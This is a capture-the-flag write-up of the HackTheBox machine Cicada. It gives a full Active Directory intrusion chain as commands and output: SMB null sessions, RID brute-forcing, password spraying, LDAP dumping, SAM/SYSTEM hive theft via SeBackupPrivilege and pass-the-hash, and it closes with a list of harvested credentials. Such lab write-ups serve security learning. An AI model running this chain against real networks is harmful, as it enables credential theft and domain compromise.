---
title: Writeup for the machine Cicada from Hackthebox
layout: post
image: "https://github.com/user-attachments/assets/2203f6e0-7931-4a60-bde6-b49f56c226e6"
author: "0xRar"
tags:
- Writeups
- HackTheBox
- Boot2Root
- Active Directory
---

Hello Hacker Friends, Hope everything is well, i was a bit shocked when i saw that the cicada machine was AD its been a while
and since i was studying AD myself it was a perfect chance to learn new things and take notes, enjoy!.

## Initial Enumeration
## Nmap
```
Nmap scan report for cicada.htb (10.129.174.158)
Host is up (0.10s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 21:05:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2024-09-29T21:05:53
|_  start_date: N/A
```

We can immediatly see some indicators of active directory domain controller:
```
53/tcp   open  domain
88/tcp   open  kerberos-sec
```

## SMB
Listing Shares:
```
┌─[✗]─[rar@parrot]─[~/HTB/Cicada]
└──╼ $smbclient -L //cicada.htb/
Password for [WORKGROUP\rar]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

The only share we can connect to via Null Session is the HR Share:
```
┌──[rar@parrot]─[~/HTB/Cicada]
└──╼ $smbclient -N //cicada.htb/HR
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
```

"Notice from HR.txt": 
```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8
[...]
```

so now we have a password without actually knowing any AD user, tried kerbrute and the only users found were `Guest`,
`Administrator` which is typical

looked around and i found out about rid bruteforcing using `NetExec`, in a nutshell in AD each user, group, computer
are considered objects and every object has its own Relative Identefier(RID) and Security Identifier(SID) 

Enumerating Usernames using rid bruteforcing:
```
┌─[rar@parrot]─[~/HTB/cicada]
└──╼ $nxc smb cicada.htb -u 'guest' -p '' --rid-brute
SMB         10.129.81.230   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
10.129.81.230   445    CICADA-DC        [+] cicada.htb\\guest: 
10.129.81.230   445    CICADA-DC        498: CICADA\\Enterprise Read-only Domain Controllers (SidTypeGroup)
10.129.81.230   445    CICADA-DC        500: CICADA\\Administrator (SidTypeUser)
10.129.81.230   445    CICADA-DC        501: CICADA\\Guest (SidTypeUser)
10.129.81.230   445    CICADA-DC        502: CICADA\\krbtgt (SidTypeUser)
10.129.81.230   445    CICADA-DC        512: CICADA\\Domain Admins (SidTypeGroup)
10.129.81.230   445    CICADA-DC        1103: CICADA\\Groups (SidTypeGroup)
10.129.81.230   445    CICADA-DC        1104: CICADA\\john.smoulder (SidTypeUser)
10.129.81.230   445    CICADA-DC        1105: CICADA\\sarah.dantelia (SidTypeUser)
10.129.81.230   445    CICADA-DC        1106: CICADA\\michael.wrightson (SidTypeUser)
10.129.81.230   445    CICADA-DC        1108: CICADA\\david.orelious (SidTypeUser)
10.129.81.230   445    CICADA-DC        1109: CICADA\\Dev Support (SidTypeGroup)
10.129.81.230   445    CICADA-DC        1601: CICADA\\emily.oscars (SidTypeUser)
```

Users Found ! 
```
Administrator
guest
david.orelious
michael.wrightson
sarah.dantelia
john.smoulder
emily.oscars
```

now that we have the usernames we can password spray 

Password Spray:
```
┌─[✗]─[rar@parrot]─[~/HTB/Cicada]
└──╼ $nxc smb cicada.htb -u users -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.174.158  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.174.158  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.174.158  445    CICADA-DC        [-] cicada.htb\guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.174.158  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.174.158  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

## LDAP
```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

a good way after containing correct credentials is to dump information from ldap which acts as dictionary
for active directory.

Ldapdomaindump:
```
┌─[✗]─[rar@parrot]─[~/HTB/Cicada]
└──╼ $ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

in `domain_users.html` user `david.orelious` has the password stored in the description:
```
SID: 1108
Description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

SMB DEV Share access using david's user:
```
┌─[✗]─[rar@parrot]─[~/HTB/Cicada]
└──╼ $smbclient //cicada.htb/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024
```

`Backup_script.ps1`:
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## Foothold 
And thanks to emily for hard coding credentials, we can log in :)
```
evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```


## PrivEsc
After logging in to the user `emily.oscars`, checking the privliges for the account
gave us a huge idea on what to do research about, looking up dangreous windows privliges should be 
more than enough to find out how to abuse `SeBackupPrivilege`.

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### Abusing `SeBackupPrivilege`:
Firstly the `SeBackupPrivilege` is a user privilge that allows a specific user to bypass
file system permissions.


```
Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/29/2024   7:14 PM                Temp


*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> download sam                                        
Info: Downloading C:\Temp\sam to sam

*Evil-WinRM* PS C:\Temp> download system                                        
Info: Downloading C:\Temp\system to system
```
if that didn't work, login via smb and use `get system`

pypykatz:
```
┌─[✗]─[rar@parrot]─[~/HTB/Cicada]
└──╼ $pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Logging in by passing the administrator's hash:
```
┌─[rar@parrot]─[~/HTB/Cicada]
└──╼ $evil-winrm -i cicada.htb -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```
and thats it ! we are NT AUTHORITY

## Loot 
```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
david.orelious:aRt$Lp#7t*VQ!3
emily.oscars:Q!3@Lp#M6b*7t*Vt
Administrator:2b87e7c93a3e8a0ea4a581937016f341
```

